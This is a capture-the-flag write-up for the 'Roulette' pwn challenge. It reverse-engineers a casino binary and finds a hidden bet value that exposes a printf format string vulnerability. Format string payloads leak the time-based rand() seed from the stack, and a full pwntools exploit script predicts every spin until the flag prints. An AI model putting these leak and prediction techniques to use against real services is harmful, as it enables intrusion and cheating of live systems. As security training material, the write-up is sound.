# Roulette
Category: Pwn, 150 Points

## Description
> nc challenges.ctfd.io 30426

A binary file was attached.

## Solution

Let's run the attached binary:

```console
root@kali:/media/sf_CTFs/matrix/Roulette# ./roulette.bin
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
17
num is : 29
The house always wins... Bye!
```

So this looks like a standard roulette game, where we need to guess the number that will turn up.

Let's open Ghidra and see what we're dealing with under the hood:

```c
int genrate_random_number(int param_1,int param_2)
{
  int iVar1;
  
  iVar1 = rand();
  return param_1 + iVar1 % ((param_2 - param_1) + 1);
}

undefined8 main(void)
{
  int rand_num;
  int res1;
  int res2;
  ssize_t sVar1;
  uint bet;
  ulong num_games;
  int local_3c;
  long time_seed;
  uint expected_num;
  undefined4 local_2c;
  uint *p_points;
  undefined8 local_20;
  char *p_command;
  int i;
  
  p_command = (char *)0x0;
  local_20 = 0;
  p_points = (uint *)0x0;
  local_2c = 0;
  num_games = 2;
  bet = 0;
  expected_num = 0;
  time_seed = 0;
  p_points = (uint *)malloc(4);
  *p_points = 1;
  time_seed = time((time_t *)0x0);
  srand((uint)time_seed);
  rand_num = genrate_random_number(1000,10000);
  time_seed = time_seed + rand_num;
  srand((uint)time_seed);
  fflush(stdout);
  puts("Welcome to Casino Royal");
  fflush(stdout);
  printf("This is a roulette game\nYou have %d point to start with.\n",(ulong)*p_points);
  fflush(stdout);
  puts("How many games would you like to play(Up to 2)?");
  fflush(stdout);
  res1 = __isoc99_scanf(&DAT_00102090,&num_games);
  if (res1 == 1) {
    fflush(stdin);
    if ((num_games < 3) || (num_games == 0xffffffffffffffff)) {
      i = 0;
      while ((ulong)(long)i < num_games) {
        puts("Choose your bet (1-36)");
        fflush(stdout);
        res2 = __isoc99_scanf(&DAT_001020f1,&bet);
        if (res2 != 1) {
          printf("Something went wrong!");
          fflush(stdout);
        }
        fflush(stdin);
        if (((int)bet < 1) || (36 < (int)bet)) {
          if (bet == 202009) {
            puts(
                "Please enter your command (it will be printed to make sure you entered the right one):"
                );
            fflush(stdout);
            p_command = (char *)malloc(0x40);
            sVar1 = read(0,p_command,0x40);
            local_3c = (int)sVar1;
            fflush(stdout);
            if (local_3c == -1) {
              puts("something went wrong with your command");
              fflush(stdout);
            }
            printf(p_command);
            fflush(stdout);
            free(p_command);
            goto LAB_00101588;
          }
          puts("Bet is out of range... choose another");
          fflush(stdout);
        }
        else {
          expected_num = genrate_random_number(1,0x24);
          printf("num is : %d\n",(ulong)expected_num);
          fflush(stdout);
          if (expected_num != bet) {
            puts("The house always wins... Bye!");
            fflush(stdout);
            free(p_points);
            return 0;
          }
          *p_points = *p_points * 0x24;
          printf("You won this round\nPoints: %d\n",(ulong)*p_points);
          fflush(stdout);
LAB_00101588:
          if (10000000 < (int)*p_points) {
            free(p_points);
            puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
            fflush(stdout);
            return 0;
          }
        }
        i = i + 1;
      }
    }
    else {
      puts("You\'re trying to trick me! I\'m leaving...");
      fflush(stdout);
    }
  }
  else {
    puts("Something went wrong!");
    fflush(stdout);
  }
  return 0;
}
```

The decompilation output reveals much more than was obvious from the UI. First, we see that instead of entering a number of games between 1 and 2, we can also enter an additional value of `-1` (represented as `0xffffffffffffffff` in two's complement) in order to receive a practically infinite number of games. However, that isn't all. We also have the ability to enter a magic value as the bet, offering us a hidden "command" feature:

```c
if (bet == 202009) {
    puts(
        "Please enter your command (it will be printed to make sure you entered the right one):"
        );
    fflush(stdout);
    p_command = (char *)malloc(0x40);
    sVar1 = read(0,p_command,0x40);
    local_3c = (int)sVar1;
    fflush(stdout);
    if (local_3c == -1) {
        puts("something went wrong with your command");
        fflush(stdout);
    }
    printf(p_command);
    fflush(stdout);
    free(p_command);
    goto LAB_00101588;
}
```

This command feature reads a string from the user, then prints it out using `printf` effectively creating a format string vulnerability. This means that if we enter an input that looks like a format string specifier, it will be interpreted as such:

```console
root@kali:/media/sf_CTFs/matrix/Roulette# ./roulette.bin
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
202009
Please enter your command (it will be printed to make sure you entered the right one):
%x.%x.%x.%x.%x.%x.%x.%x
0.0.c00.0.5034bbe0.f0b5ff.c2.1
```

That's all nice, but how does this help us get the flag? Well, the flag is printed if we are able to get more than 10000000 points:
```c
if (10000000 < (int)*p_points) {
    free(p_points);
    puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
    fflush(stdout);
    return 0;
}
```

And one of the ways to gain that much points is to win the game time after time. To do that, we need to know what is the selected number, the one generated by calling `rand()` within `genrate_random_number(1,0x24)`. How do we predict what is the value that `rand()` will return? Well, since `rand()` is just a pseudo-random generator, it becomes trivial as long as we have the seed that was using for initializing `rand()` via a call to `srand()`. 

In our program we have two calls to `srand`. The first one provides a seed based on the current Unix time. Then, another "random" number is added to this time in order to create the second seed which will be used throughout the rest of the program:

```c
time_seed = 0;
time_seed = time((time_t *)0x0);
srand((uint)time_seed);
rand_num = genrate_random_number(1000,10000);
time_seed = time_seed + rand_num;
srand((uint)time_seed);
```

This is pretty predictable by itself, since we have a very good estimation for the initial timestamp. However, we can avoid the need for estimations altogether by using the format string vulnerability we saw earlier and leaking `time_seed` from the stack.

First, we leak a few values from the stack and look for a value that looks like a Unix timestamp:
```console
root@kali:/media/sf_CTFs/matrix/Roulette# date +%s && ./roulette.bin
1613936438
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
202009
Please enter your command (it will be printed to make sure you entered the right one):
%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.
0.0.3072.0.687061984.15775231.194.1.-1262164427.1613944924.0.-1240788320.0.
```

We started the program at `1613936438`, and the tenth value on the stack is `1613944924`. That seems close enough to be the timestamp.

Now, all that's left is to use this value as the seed for `srand` and guess all the random numbers until we have enough points to get the flag.

```python
# First, generate pwntools template via:
#  pwn template --host challenges.ctfd.io --port 30426 roulette.bin

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

from ctypes import *

MAX_POINTS = 10000000
EXEC_COMMAND_BET_VALUE = 202009

def send_bet(bet):
    log.info(f"Sending bet: {bet}")
    io.sendlineafter("Choose your bet (1-36)\n", str(bet))
    if bet != EXEC_COMMAND_BET_VALUE:
        io.recvuntil("You won this round\nPoints: ")
        num_points = io.recvline_regexS(r"\d+", keepends = False)
        return int(num_points)
    else:
        return None

def exec_command(command):
    send_bet(EXEC_COMMAND_BET_VALUE)
    io.sendlineafter("Please enter your command (it will be printed to make sure you entered the right one):\n", command)
    return io.recvlineS(keepends = False)

def genrate_random_number(start, end):
    random_num = libc.rand()
    return start + random_num % ((end - start) + 1)

def init_game():
    io.recvuntil("This is a roulette game\nYou have ")
    num_points = io.recvregexS(r"\d+")
    io.recvuntil(" point to start with.\n")
    io.sendlineafter("How many games would you like to play(Up to 2)?\n", "-1")
    return int(num_points)

if __name__ == '__main__':
    libc = CDLL("libc.so.6")

    io = start()

    num_points = init_game()

    time_seed = int(exec_command("%10$d"))
    log.info(f"Seed: {time_seed}")
    libc.srand(time_seed)

    while num_points < MAX_POINTS:
        expected_num = genrate_random_number(1, 0x24)
        num_points = send_bet(expected_num)
        
    print(io.recvallS())
```

Output:
```console
root@kali:/media/sf_CTFs/matrix/Roulette# python3 exploit.py
[*] '/media/sf_CTFs/matrix/Roulette/roulette.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenges.ctfd.io on port 30426: Done
[*] Sending bet: 202009
[*] Seed: 1613943855
[*] Sending bet: 18
[*] Sending bet: 20
[*] Sending bet: 25
[*] Sending bet: 12
[*] Sending bet: 35
[+] Receiving all data: Done (55B)
[*] Closed connection to challenges.ctfd.io port 30426
You Won!
 The Flag is: MCL{I_HOPE_YOU'LL_BE_HAPPY_NOW}
```